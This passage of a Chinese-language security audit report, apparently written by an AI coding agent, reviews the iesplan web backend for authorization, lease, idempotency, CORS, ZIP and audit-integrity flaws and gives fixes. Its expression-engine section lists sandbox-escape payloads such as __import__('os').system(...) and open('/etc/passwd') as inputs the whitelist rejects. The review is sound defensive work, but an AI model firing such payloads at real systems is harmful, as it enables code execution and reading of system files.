1. 启用 Redis ACL 和强随机密码。
2. 生产环境启用 TLS 或至少限制 Docker 网络访问。
3. 使用独立 Redis 用户和最小命令权限。
4. 不允许 Worker 使用管理型 Redis 命令。
5. 对队列消息增加签名或服务端可验证字段。
6. 继续确保 Worker 从 PostgreSQL 验证任务状态和租约，不信任 Redis 消息本身。

---

## M-11：管理员审计接口未合并认证审计，权限变化也未完整进入认证审计

**严重度：中**

### 位置

- `backend/iesplan/api/admin.py:89-109`
- `backend/iesplan/services/audit.py:194-240`
- `backend/iesplan/services/identity.py:254-282`
- `backend/iesplan/services/project.py:134-177`
- `backend/iesplan/services/project.py:180-242`

### 问题描述

登录、失败登录、登出、密码修改、密码重置和会话接管主要写入 `auth_events`。

但管理员 `/api/admin/audit` 主要查询 `AuditLog`，没有统一合并认证事件。

成员增删和所有权转移主要写项目审计，没有完整写入认证审计中的权限变更事件。

### 攻击场景

安全人员通过统一审计接口无法完整调查：

- 登录爆破；
- 会话接管；
- 密码重置；
- 会话撤销；
- 项目成员权限变化；
- 所有权转移。

发生账号入侵时，事件关联和时间线不完整。

### 修复建议

- 建立统一审计视图或认证审计 API；
- 统一字段：
  - 操作者；
  - 目标用户；
  - 项目；
  - 原角色；
  - 新角色；
  - 会话 ID；
  - 请求 ID；
  - IP；
  - User-Agent；
  - 时间；
- 权限变化与业务事务同一事务提交；
- 审计查询默认脱敏并严格分页。

---

## M-12：自助注册开关为进程内状态，多 Worker 间可能不一致

**严重度：中**

### 位置

- `backend/iesplan/api/auth.py:32-47`
- `backend/iesplan/api/auth.py:343-359`
- `backend/iesplan/api/auth.py:431-445`
- `docker-compose.yml:31-33`

### 问题描述

注册开关保存在 Python 进程内，后端使用两个 Uvicorn Worker。

管理员关闭注册后：

- 只影响当前 Worker；
- 另一个 Worker 可能仍接受注册；
- 服务重启后恢复默认状态。

### 攻击场景

管理员关闭公开注册后，攻击者通过负载均衡或重复请求命中另一个 Worker，继续创建 engineer 账号。

### 修复建议

- 将注册开关持久化到数据库安全设置表；
- 所有 Worker 从同一权威来源读取；
- 更新后使用缓存失效或版本号；
- 注册接口和设置接口使用同一事务语义；
- 关闭注册后增加审计和生效时间。

---

## M-13：CSV 诊断列表可能无界增长，形成响应放大

**严重度：中**

### 位置

- `backend/iesplan/services/dataset.py:374-470`
- `backend/iesplan/api/datasets.py:127-140`
- `backend/iesplan/api/datasets.py:280-284`

### 问题描述

解析过程中可能按行、按时间戳和按字段错误追加诊断。未发现统一的最大诊断数量、最大错误字段长度和响应总大小限制。

### 攻击场景

构造每行都非法的 CSV：

- 解析完整文件；
- 创建大量诊断对象；
- 返回大型 JSON；
- 消耗内存、CPU 和网络带宽。

### 修复建议

- 最多保留固定数量诊断，例如 100～500 条；
- 超出后按错误码聚合计数；
- 设置错误字段最大长度；
- 达到阻断阈值后停止细粒度解析；
- 限制整个响应大小。

---

# 6. 低危问题

## L-01：密码复杂度最低要求偏低，缺少常见/泄露密码阻断

**严重度：低**

### 位置

- `backend/iesplan/core/security.py:23-26`
- `backend/iesplan/core/security.py:62-82`

### 问题描述

当前要求主要为：

- 至少 8 位；
- 大写；
- 小写；
- 数字。

未发现常见密码和已泄露密码黑名单。

bcrypt 使用 rounds=12，哈希实现总体合理，本项不是弱哈希问题。

### 攻击场景

攻击者使用常见但满足复杂度规则的密码进行撞库或密码猜测。

### 修复建议

- 最低长度提高到 12～14 位；
- 支持长密码；
- 拒绝常见密码、默认密码和已泄露密码；
- 可逐步迁移 Argon2id；
- 密码策略应侧重长度和泄露检测，而非仅复杂度组合。

---

## L-02：登录响应返回明文 Token，削弱 HttpOnly Cookie 的防护模型

**严重度：低到中**

### 位置

- `backend/iesplan/api/auth.py:110-116`
- `backend/iesplan/api/auth.py:267-269`
- `frontend/src/api/client.ts:79-129`

### 问题描述

登录同时：

- 设置 HttpOnly Cookie；
- 在 JSON 响应中返回真实 Token。

前端没有将真实 Token 存入 localStorage，而只保存：

```text
iesplan.session = "1"
```

这一点是正向的，但 Token 仍可能被：

- 前端脚本；
- 浏览器扩展；
- 调试工具；
- 代理日志；
- 响应日志；
- 错误上报系统

获取。

### 攻击场景

存在 XSS、恶意浏览器扩展或日志泄露时，攻击者可直接获得 Bearer Token，而不需要读取 HttpOnly Cookie。

### 修复建议

如果系统以 HttpOnly Cookie 为主：

- 登录响应不返回真实 Token；
- 前端仅依赖 Cookie；
- Bearer 模式单独设计给非浏览器客户端；
- 严禁日志记录认证响应体。

---

## L-03：对象损坏错误可能泄露服务器绝对路径

**严重度：低**

### 位置

- `backend/iesplan/services/objects.py:168-182`
- `backend/iesplan/main.py:93-103`

### 问题描述

对象缺失异常参数中包含：

```python
"path": str(path)
```

全局错误封装会返回异常参数，可能把类似以下内容暴露给用户：

```text
/data/iesplan/objects/...
```

### 攻击场景

攻击者访问损坏或缺失对象，得到：

- 容器数据目录；
- 挂载点；
- 文件组织方式；
- 部署路径信息。

### 修复建议

用户响应只返回：

- 稳定错误码；
- 抽象对象 ID；
- 完整性校验状态。

物理路径只写入受控内部日志，并对日志中的 Token、密码和敏感参数进行脱敏。

---

## L-04：ZIP 路径校验不完整，未来落盘时可能形成 ZipSlip

**严重度：低**

### 位置

- `backend/iesplan/services/package.py:628-636`

### 问题描述

当前检查主要为：

```python
name.startswith("/")
or ".." in name.split("/")
```

不足包括：

- 未处理反斜杠；
- 未拒绝 Windows 盘符；
- 未拒绝 NUL；
- 未规范化 `.` 和空路径段；
- 未检查 ZIP symlink；
- 未拒绝规范化后重复路径。

当前代码没有直接 `extractall()`，因此暂未确认任意文件写入链。

### 修复建议

- 按 POSIX 规范化 ZIP 路径；
- 拒绝绝对路径、盘符、反斜杠、NUL、`..` 和 symlink；
- 拒绝重复规范化路径；
- 落盘时用 `resolve()` 验证位于隔离根目录；
- 不对不可信 ZIP 使用 `extractall()`。

---

## L-05：HMAC 签名比较未使用常量时间比较

**严重度：低**

### 位置

- `backend/iesplan/services/package.py:142-162`
- `backend/iesplan/services/package.py:150`

### 问题描述

当前使用：

```python
if _token_sign(payload) != sig:
```

而非：

```python
hmac.compare_digest(expected, actual)
```

### 攻击场景

理论上可能通过远程响应时间差尝试推测签名。

实际风险受到网络抖动、HMAC 长度和短期过期机制限制，属于纵深防御问题。

### 修复建议

使用：

```python
hmac.compare_digest(_token_sign(payload), sig)
```

并严格校验签名长度和字符集。

---

## L-06：上传文件类型和 MIME 校验较弱

**严重度：低**

### 位置

- `backend/iesplan/api/projects.py:360-375`
- `backend/iesplan/api/datasets.py:241-277`
- `backend/iesplan/services/package.py:612-695`

### 问题描述

项目包和 CSV 接口没有充分使用：

- 文件扩展名；
- `UploadFile.content_type`；
- ZIP magic bytes；
- CSV 编码和结构检查。

项目包中的 `media_type` 等字段部分来自包内元数据。

### 攻击场景

攻击者提交：

- 扩展名与内容不符的文件；
- 伪造 MIME；
- 伪造 manifest 中的媒体类型。

当前未发现仅靠伪造 MIME 即可触发后端代码执行，但会污染下游类型判断和审计数据。

### 修复建议

- MIME/扩展名只作为辅助检查；
- 内容结构作为权威检查；
- ZIP 校验 magic bytes；
- manifest 中的类型字段使用白名单；
- 原始上传内容先进入隔离区，规范化后再绑定业务对象。

---

# 7. 表达式引擎、注册表和任意代码执行审查

## 7.1 未发现已确认的表达式 AST 逃逸

审查位置：

- `backend/iesplan/core/expression.py:33-42`
- `backend/iesplan/core/expression.py:195-287`
- `backend/iesplan/core/expression.py:392-590`

已确认的正向控制：

- 未使用 Python `eval()` 执行用户表达式；
- 未使用 `exec()`；
- 未使用 `compile()` 执行用户代码；
- 禁止属性访问和下标访问；
- 禁止 lambda、推导式、集合、字典等复杂节点；
- 函数调用必须来自固定函数白名单；
- 变量必须来自允许变量集合；
- AST 节点数和深度有限制；
- 求值步骤有限制；
- 对除零、溢出、定义域和非有限结果有运行时保护。

以下典型载荷应在 AST 白名单阶段被拒绝：

```python
__import__("os").system(...)
().__class__.__mro__
open("/etc/passwd")
globals()
locals()
lambda: ...
[x for x in values]
```

## 7.2 未发现注册表动态导入导致的直接 RCE

审查位置：

- `backend/iesplan/core/registry.py:1-8`
- `backend/iesplan/core/registry.py:162-180`
- `backend/iesplan/core/registry.py:176-636`

注册表为静态内置注册，未发现：

- 根据用户输入动态 import；
- 运行时加载上传插件；
- entry point 任意扩展；
- 根据用户输入执行模块路径。

## 7.3 Worker 动态导入和 pickle 是高影响纵深风险

审查位置：

- `backend/iesplan/worker/solver_process.py:51-62`
- `backend/iesplan/worker/solver_process.py:107-125`
- `backend/iesplan/worker/solver_process.py:227-250`
- `backend/iesplan/services/queue.py:296-337`

Worker 子进程使用 `pickle.loads()` 解析父子进程请求，并存在动态 callable 解析逻辑。

当前静态审查未确认普通用户可以直接控制：

- Python 模块路径；
- callable 名称；
- pickle 请求内容。

因此不应将其报告为已确认的普通用户 RCE。但如果 Redis 被写入、Worker 内部边界被绕过，或者未来新增任务类型直接使用外部 callable 字段，则可能形成任意代码执行。

建议：

- 用固定 callable ID 映射到服务端白名单；
- 禁止外部消息传入模块路径；
- 不使用不可信 pickle；
- 使用 JSON 或受限序列化；
- Worker 使用低权限账号、独立容器和最小文件系统权限。

---

# 8. 内容寻址、快照和不可变性结论

## 已验证的有效控制

### 对象完整性

`backend/iesplan/services/objects.py:295-341`、`409-424`：

- 使用 SHA-256；
- 文件名由摘要生成；
- 临时文件写入；
- `fsync()`；
- `os.replace()` 原子替换；
- 读取时校验文件大小和 SHA-256。

### 项目包完整性

`backend/iesplan/services/package.py:659-688`：

- 校验对象 SHA-256；
- 校验对象大小；
- 反向检查包文件是否全部出现在清单中；
- 导入确认阶段重新读取和解析暂存包。

### Worker 任务 fencing

Worker 任务租约使用 `lease_token`，并在：

- 进度写入；
- 证据提交；
- 任务收尾；
- 失败/取消收拢

过程中校验当前租约和 token，具备较好的任务级防僵尸写控制。

## 仍存在的问题

### 项目包哈希不是来源真实性证明

攻击者可以构造恶意内容，并重新计算 SHA-256，只要清单和内容一致即可通过完整性校验。

如果设计要求“可信发布者”或“可信项目包”，还需要：

- 发布者签名；
- 信任根；
- 签名密钥轮换；
- 包版本和发布者绑定。

### 不可变表触发器尚未被初始化

位置：

- `backend/iesplan/models/immutable_triggers.py:15-65`
- `backend/iesplan/db.py:38-47`

`immutable_triggers.py` 只是定义 SQL 常量，并明确说明 `create_all` 不会自动挂载触发器。

`init_db()` 只执行：

```python
Base.metadata.create_all(bind=engine)
seed_admin()
```

未执行：

- 不可变表触发器；
- `REVOKE UPDATE, DELETE`；
- 状态机冻结触发器。

因此下列表可能仍可被 UPDATE/DELETE：

- `audit_log`
- `auth_events`
- `project_versions`
- `dataset_versions`
- `calc_snapshots`
- `task_diagnostics`
- `evidence_packages`
- `result_assessments`

这会削弱审计和快照不可变性，应至少作为上线前必须修复项。

---

# 9. 前端安全结论

## 正向控制

### 401 处理总体合理

位置：

- `frontend/src/api/client.ts:275-291`

前端会区分：

- 明确的会话失效；
- 普通权限错误；
- 登录接口失败。

只有在明确会话失效或错误信封缺失时才清理前端会话标记并跳转登录页，避免把普通权限错误误判为登出。

### Token 未写入 localStorage

位置：

- `frontend/src/api/client.ts:79-129`

前端 localStorage 只保存：

```text
iesplan.session = "1"
```

不是实际 Token。真实认证凭证主要依赖 HttpOnly Cookie，这一点优于将 Token 直接放入 localStorage。

### 未发现明显 React XSS sink

未发现：

- `dangerouslySetInnerHTML`
- `innerHTML`
- `eval`
- `new Function`
- `javascript:` URL

React 默认输出转义，因此静态审查未发现明显前端 DOM XSS 链路。

## 需要改进

- 登录 JSON 不应同时返回真实 Token；
- Cookie API 应增加 CSRF Token；
- 下载 Token 不应长期出现在 URL 查询参数；
- 应补充 CSP、HSTS、`X-Content-Type-Options`、`frame-ancestors` 等安全响应头；
- `IESPLAN_CORS_ORIGINS` 必须在生产环境使用严格固定 allowlist，禁止配置为任意来源。

---

# 10. 修复优先级

## P0：立即修复

1. 删除 `X-User-Id` 管理员认证回退。
2. 移除默认管理员密码，后端强制首次改密。
3. 修复模型 API 的项目级授权检查。
4. 轮换并强制校验 `IESPLAN_SECRET_KEY`。
5. 下载 Token 绑定项目、用户、用途和一次性状态。
6. 修复会话接管确认前仍可执行完整业务操作的问题。
7. 启用 Cookie API 的 CSRF 防护。
8. 修复任务取消接口缺少项目权限检查的问题。

## P1：上线前修复

9. 使用 Redis/数据库实现多 Worker 共享登录限速。
10. 对项目包和 CSV 实施流式上传限制。
11. 增加 ZIP 条目数、单条目大小、总展开量和压缩比限制。
12. 修复普通和管理员所有权转移条件校验。
13. 在所有权限查询中检查 `expires_at`。
14. 部署不可变表触发器和数据库 `REVOKE` 权限。
15. 脱敏任务堆栈、路径和诊断 context。
16. 修复 Redis ACL、密码和网络隔离。
17. 修复模型、配置和项目包中的 NaN/Infinity 校验。

## P2：纵深防御

18. 修复幂等键作用域和请求指纹校验。
19. 修复 Excel 公式注入。
20. 限制 CSV 诊断数量和响应大小。
21. 对对象路径增加根目录和 symlink 防护。
22. 完善 ZIP 路径规范化和 MIME/结构校验。
23. 登录响应不再返回真实 Token。
24. 使用 `hmac.compare_digest()`。
25. 增强 CSP、HSTS 和其他安全响应头。

---

# 11. 总体安全评级

## **D：高风险**

当前系统在以下方面具备较好的安全基础：

- bcrypt 密码哈希，rounds=12；
- 会话 Token 使用高熵随机值，数据库仅保存哈希；
- 凭证版本变化可以使旧会话失效；
- Worker 任务租约具备 fencing token；
- 项目包和对象具备 SHA-256 完整性校验；
- 表达式引擎采用 AST 白名单，未发现直接 `eval`/`exec` 逃逸；
- 注册表为静态内置注册；
- 前端未将真实 Token 写入 localStorage；
- 未发现明显 React XSS sink。

但这些正向控制无法抵消当前的关键风险，尤其是：

1. 未认证管理员对象运维接口；
2. 默认管理员密码和未强制首登改密；
3. 模型 API 缺少项目授权；
4. 默认下载签名密钥和跨项目对象访问边界不足；
5. 接管确认前新会话已有完整权限；
6. 缺少 CSRF；
7. 上传和 ZIP 解析资源限制不足；
8. 任务和所有权边界校验不完整。

**在 P0/P1 项修复并通过 owner/viewer/admin、并发接管、上传资源耗尽、跨项目访问和审计完整性回归测试之前，不建议投入多用户生产环境。**
codex
## 补充复核结果

补充审查又发现若干需要并入上一版报告的高危和中危问题。以下项目应视为对上一版报告的修订，其中部分问题需要提升严重度。

---

# 一、需要提升严重度或新增的高危问题

## H-11：租约过期未纳入统一 fencing 校验，旧 Worker 可能迟到写回

**严重度：高**

### 位置

- `backend/iesplan/worker/lease.py:110-121`
- `backend/iesplan/worker/lease.py:124-144`
- `backend/iesplan/worker/lease.py:185-195`
- `backend/iesplan/worker/lease.py:273-302`
- `backend/iesplan/services/results.py:216-266`

### 问题描述

`verify_lease()` 主要校验：

```python
TaskLease.attempt_id == attempt_id
TaskLease.lease_token == token
TaskLease.status == "active"
```

但没有统一检查：

```python
expires_at > 当前时间
```

`renew_lease()` 的更新条件也只检查租约状态和 token，没有检查租约是否已经过期。

证据提交路径在 `services/results.py:216-266` 单独检查了过期时间，但其他进度、失败、取消、释放和续租路径仍依赖不完整的 `verify_lease()`。

### 攻击场景

1. Worker A 获得任务和租约；
2. Worker A 被暂停、网络分区或进程冻结，超过租约 TTL；
3. 系统让 Worker B 接管任务；
4. Worker A 恢复后使用旧 token 调用：
   - 续租；
   - 写入进度；
   - 失败收拢；
   - 取消收拢；
   - 写入结果或状态；
5. 旧 Worker 继续影响新尝试或新结果。

这违反 RPD 第 17.9 节中“租约过期或 fencing 失效的 Worker 不得继续写回”的要求。

### 修复建议

1. 所有租约查询和写入均加入数据库时间条件：

```python
TaskLease.expires_at > sa.func.current_timestamp()
```

2. 续租 UPDATE 必须拒绝已经过期的租约，不能“复活”过期租约。
3. 进度、结果、失败、取消和租约释放都使用原子条件更新，同时校验：
   - `attempt_id`
   - `lease_token`
   - `status == active`
   - `expires_at > now`
4. 新尝试接管时，在同一事务中撤销旧租约。
5. 增加 Worker 暂停超过 TTL 后迟到写回的并发测试。

---

## H-12：结果选择接口未校验 URL 项目与任务所属项目一致

**严重度：高**

### 位置

- `backend/iesplan/api/results.py:131-160`
- `backend/iesplan/services/results.py:949-971`
- `backend/iesplan/services/results.py:1042-1076`

### 问题描述

`select_result_endpoint()` 没有在入口调用：

```python
tasks_service.ensure_task_belongs(db, project_id, task_id)
```

服务层 `select_result()` 根据 `task_id` 查找真实任务项目，并校验用户对真实项目具有 `edit` 权限，但接口随后又使用客户端 URL 中的 `project_id` 读取差异：

```python
diff = results_service.selection_diff(db, project_id)
```

因此“实际修改的项目”和“响应读取的项目”可能不是同一个项目。

### 攻击场景

用户拥有项目 A 的编辑权限，但不拥有项目 B 权限，构造：

```http
POST /api/projects/B/tasks/<project-A-task>/result/select
```

可能出现：

- 实际修改项目 A 的结果选择；
- 响应读取项目 B 的当前结果差异；
- 泄露项目 B 的结果选择、差异补丁或结果摘要；
- 审计记录中的 URL 项目与实际任务项目不一致。

### 修复建议

1. 入口第一步校验：

```python
tasks_service.ensure_task_belongs(db, project_id, task_id)
project_service.ensure_access(db, user, project_id, "edit")
```

2. `select_result()` 显式接收 `project_id` 并检查：

```text
task.project_id == project_id
```

3. `selection_diff()` 从任务或结果索引推导项目，不信任客户端路径参数。
4. 统一所有结果、评估、选择、逐时数据接口的项目—任务—结果归属检查。

---

## H-13：不可变表和终态触发器未在当前启动路径安装

**严重度：高**

上一版已列为中危，此项应提升为高危，因为它直接影响审计可信度、计算快照不可变性和结果可复现性。

### 位置

- `backend/iesplan/models/immutable_triggers.py:1-10`
- `backend/iesplan/models/immutable_triggers.py:15-65`
- `backend/iesplan/db.py:38-47`

### 问题描述

`immutable_triggers.py` 只定义 SQL 常量，并明确说明 `create_all` 不会自动挂载。

但 `init_db()` 仅执行：

```python
Base.metadata.create_all(bind=engine)
seed_admin()
```

没有执行：

- `ALL_IMMUTABLE_TRIGGER_DDL`
- `ALL_IMMUTABLE_REVOKE_DDL`
- 版本图冻结触发器；
- 配置冻结触发器；
- 终态任务触发器。

### 攻击场景

一旦数据库账号、Worker、迁移脚本或内部服务被误用，攻击者或错误代码可能：

- 修改或删除 `audit_log`；
- 修改计算快照；
- 修改项目版本；
- 修改证据包和评估；
- 修改终态任务；
- 修改已冻结的配置或版本图。

这会使审计记录和计算结果不再可信。

### 修复建议

1. 通过正式数据库迁移安装所有触发器。
2. 对不可变表执行数据库级：

```sql
REVOKE UPDATE, DELETE ON ... FROM PUBLIC;
```

3. 使用独立数据库角色：
   - 业务写入角色；
   - 审计只插入角色；
   - 管理迁移角色。
4. 启动健康检查验证触发器和权限确实存在。
5. 为新环境、升级环境和恢复环境分别增加 DDL 验证。

---

## H-14：全局幂等键可能导致跨项目任务复用和任务摘要泄露

上一版将此项列为中危。结合数据库全局唯一约束和返回字段，建议提升为高危。

### 位置

- `backend/iesplan/models/calc.py:150-158`
- `backend/iesplan/services/tasks.py:628-635`
- `backend/iesplan/api/tasks.py:83-99`
- `backend/iesplan/services/tasks.py:1157-1169`

### 问题描述

数据库约束为：

```python
UniqueConstraint("idempotency_key", name="uq_tasks_idempotency_key")
```

服务层仅按幂等键查询：

```python
select(Task).where(Task.idempotency_key == idempotency_key)
```

未绑定：

- 项目；
- 用户；
- 会话；
- 任务类型；
- 请求体哈希。

命中后直接返回已有任务，任务摘要还会返回：

- `requested_by`
- `calc_snapshot_id`
- `idempotency_key`
- `trace_id`
- 时间和状态信息。

### 攻击场景

攻击者获得或猜测其他项目的幂等键后，在自己的项目中重复使用该 key，可能得到其他项目任务摘要。

此外，同一 key 搭配不同请求体可能被静默复用，不返回冲突，造成任务业务语义错误。

### 修复建议

1. 幂等键至少按以下作用域建模：

```text
(project_id, requested_by, task_type, idempotency_key)
```

2. 保存规范化请求体哈希。
3. 相同 key、相同请求体才允许重放。
4. 相同 key、不同请求体返回 `409 Conflict`。
5. 返回已有任务前重新验证任务项目和当前用户权限。
6. 不向普通用户返回完整幂等键、trace ID 和内部请求人信息。

---

## H-15：任务详情向 viewer 暴露原始堆栈、异常消息和 context

上一版列为中危。由于 Worker 会将原始异常和 traceback 写入诊断，且 viewer 可以读取任务详情，建议提升为高危或至少高风险信息泄露问题。

### 位置

- `backend/iesplan/services/tasks.py:1269-1275`
- `backend/iesplan/services/tasks.py:872-903`
- `backend/iesplan/worker/runner.py:336-348`
- `backend/iesplan/worker/solver_process.py:270-275`

### 问题描述

响应直接包含：

```python
{
    "message": d.message,
    "stack_trace": d.stack_trace,
    "context": d.context
}
```

Worker 失败路径将：

```python
str(exc)
traceback.format_exc()
```

写入诊断。

### 攻击场景

项目 viewer 可以通过查看失败任务获得：

- 服务器绝对路径；
- Python 包和模块结构；
- 数据库或依赖服务错误；
- 求解器参数；
- 用户上传数据片段；
- 内部对象 ID；
- 错误配置；
- 如果未来误用，还可能包含 Token、密钥或连接串。

### 修复建议

普通用户仅返回：

- 稳定诊断码；
- `message_key`；
- 严重度；
- blocking；
- 白名单参数；
- correlation ID。

完整 stack trace 只进入受限运维日志或管理员专用接口，并对以下字段集中脱敏：

- 路径；
- URL；
- Authorization；
- Cookie；
- 密钥；
- 数据库连接串；
- 用户原始输入。

---

# 二、补充中危问题

## M-15：Redis 使用 `ZRANGE` 后再 `ZREM`，队列出队不是原子操作

**严重度：中**

### 位置

- `backend/iesplan/services/queue.py:150-159`

### 问题描述

出队逻辑先：

1. `ZRANGE` 获取第一个成员；
2. 再调用 `ZREM` 删除成员。

两个 Worker 可能同时读取同一个队列成员。

虽然 PostgreSQL 的任务状态和租约逻辑可能阻止最终双重执行，但 Redis 队列本身不具备原子领取语义。

### 攻击场景

高并发下可能出现：

- 两个 Worker 同时领取同一任务；
- 重复创建尝试；
- 队列顺序异常；
- 额外 CPU、数据库和日志负载；
- 任务领取失败或状态竞争。

### 修复建议

- 使用 `ZPOPMIN`；
- 或使用 Lua 脚本原子完成读取和删除；
- 继续以 PostgreSQL 行锁和条件更新作为任务领取唯一权威；
- 增加双 Worker 并发出队测试。

---

## M-16：证据中的逐时对象引用未验证项目、任务来源和内容结构

**严重度：中**

### 位置

- `backend/iesplan/services/results.py:269-330`
- `backend/iesplan/services/results.py:333-387`
- `backend/iesplan/services/results.py:1097-1160`

### 问题描述

`hourly_refs` 主要检查对象 ID 存在、字段列表非空和行数为正数，但没有确认：

- 对象属于当前项目；
- 对象由当前任务或 attempt 创建；
- 媒体类型正确；
- 实际字段与声明字段一致；
- 实际行数与声明行数一致；
- 对象内容符合逐时结果 schema。

### 攻击场景

Worker 或错误的内部调用可以在证据 payload 中引用其他项目或其他任务的合法对象。对象本身的 SHA-256 校验会通过，但结果接口可能展示错误项目的逐时数据。

### 修复建议

证据提交时必须验证：

- 项目归属；
- 任务归属；
- attempt 归属；
- 对象类型；
- 对象引用关系；
- 内容字段和行数；
- solution 与任务结果的一致性。

---

## M-17：对象引用冲突时直接 `db.rollback()`，可能回滚调用方整个事务

**严重度：中**

### 位置

- `backend/iesplan/services/objects.py:347-366`
- `backend/iesplan/services/objects.py:505-522`

### 问题描述

对象写入或引用建立遇到唯一约束冲突时直接调用：

```python
db.rollback()
```

这会回滚整个 SQLAlchemy Session，而不只是当前对象操作。

同时，文件可能已经通过临时文件和 `os.replace()` 写入最终路径，导致数据库事务和文件状态不一致。

### 攻击场景

并发对象写入或引用冲突时可能出现：

- 项目或任务之前的数据库修改被一起回滚；
- 文件已经存在但没有数据库记录；
- 数据库有对象记录但引用事务已回滚；
- 后续清理逻辑判断错误；
- 请求返回 500，业务状态不一致。

### 修复建议

- 使用 `db.begin_nested()` 建立 savepoint；
- 使用数据库 upsert；
- 明确文件提交与数据库提交的补偿策略；
- 增加孤立文件、孤立元数据和错误引用的后台一致性扫描。

---

## M-18：Worker payload 可以指定 `created_by`，审计主体可被伪造

**严重度：中**

### 位置

- `backend/iesplan/services/results.py:357-385`

### 问题描述

证据写入使用：

```python
actor_id = payload.get("created_by") or task.requested_by
created_by = int(payload.get("created_by") or task.requested_by)
```

这使 Worker payload 能影响：

- `EvidencePackage.created_by`；
- 对象审计 actor；
- 引用审计；
- 证据包创建主体。

### 攻击场景

被攻陷或存在逻辑错误的 Worker 可以将结果伪装为：

- 管理员创建；
- 某工程师创建；
- 其他项目成员创建；
- 其他用户授权。

审计记录将无法可靠追责。

### 修复建议

- `created_by` 不应来自 Worker payload；
- 服务端根据任务请求人、Worker 身份、当前租约和系统 actor 计算；
- 如果需要保留 Worker 声明的用户 ID，将其作为不可覆盖的声明字段，并由服务端验证。

---

## M-19：结果评估/选择的并发更新可能产生唯一约束冲突或状态不一致

**严重度：中**

### 位置

- `backend/iesplan/services/results.py:856-875`
- `backend/iesplan/services/results.py:1008-1023`
- `backend/iesplan/models/result.py:113-150`
- `backend/iesplan/worker/lease.py:236-255`

### 问题描述

结果索引和结果选择都采用：

1. 查询当前行；
2. 将旧行标记为非当前；
3. 插入新行；
4. 依赖唯一索引保证最多一行。

并发评估、选择或 Worker 提交时，两个事务可能同时读到相同旧值。

### 攻击场景

可能出现：

- 唯一约束异常；
- API 500；
- 事务回滚；
- 当前选择与审计记录不一致；
- 结果索引没有有效当前行；
- 并发选择丢失。

### 修复建议

- 对项目或结果索引行使用 `SELECT FOR UPDATE`；
- 使用数据库 upsert 或显式事务锁；
- 唯一约束冲突转为明确的 `409`；
- 评估和选择增加幂等机制；
- 增加并发 assess/select/submit_result 测试。

---

## M-20：检查任务接口可无限重复创建，缺少幂等和配额

**严重度：中**

### 位置

- `backend/iesplan/api/results.py:208-220`
- `backend/iesplan/services/results.py:1218-1244`

### 问题描述

每次调用检查接口都会创建一个新的 `report` 任务，没有：

- 服务端幂等键；
- 同一证据包的 queued/running 检查任务复用；
- 项目级频率限制；
- 用户级并发限制。

### 攻击场景

脚本或有编辑权限的用户快速重复调用检查接口，造成：

- Worker 队列堆积；
- 任务饥饿；
- CPU/IO 消耗；
- 报告对象和审计记录膨胀；
- 其他项目任务延迟。

### 修复建议

使用以下字段生成服务端幂等键：

```text
(project_id, source_task_id, evidence_package_id, action)
```

已有 queued/running 任务时直接复用，并为检查接口设置项目级和用户级配额。

---

## M-21：CORS 配置在生产环境可被环境变量放宽，形成配置型跨站风险

**严重度：中，条件性**

### 位置

- `backend/iesplan/main.py:175-195`

### 问题描述

当前：

```python
allow_credentials=True
allow_methods=["*"]
allow_headers=["*"]
```

来源列表由 `IESPLAN_CORS_ORIGINS` 完全覆盖。

默认来源是本机开发地址，默认配置本身并不是任意 Origin 漏洞；但生产配置若加入恶意域名、被接管的子域或宽泛来源，则 Cookie 会话可被跨源携带，并且响应可被读取。

### 攻击场景

攻击者控制被加入 CORS allowlist 的站点后，可以在用户浏览器中读取：

- 项目数据；
- 任务状态；
- 结果和导出信息；
- 管理接口响应。

### 修复建议

- 生产环境固定 allowlist；
- 启动时拒绝 `*`、空 Origin 和非 HTTPS 生产来源；
- 只开放必要方法和请求头；
- CORS 配置变更需要审计；
- 不允许通过未经审批的环境变量改变生产信任边界。

---

## M-22：任务结果和审计响应可能包含过大的业务数据

**严重度：中**

### 位置

- `backend/iesplan/services/results.py:783-808`
- `backend/iesplan/services/results.py:1197-1207`
- `backend/iesplan/services/results.py:1024-1029`

### 问题描述

结果视图和审计记录可能包含：

- 候选解；
- 详细结果；
- `plan_summary`；
- `hourly_refs`；
- 完整差异补丁；
- 评估细节。

这可能超过设计要求的“诊断和审计不得复制完整模型、完整数据集或原始求解日志”。

### 攻击场景

viewer 通过结果历史或结果详情获取超出其必要范围的：

- 完整候选参数；
- 模型输入；
- 逐时数据引用；
- 差异补丁；
- 内部诊断上下文。

### 修复建议

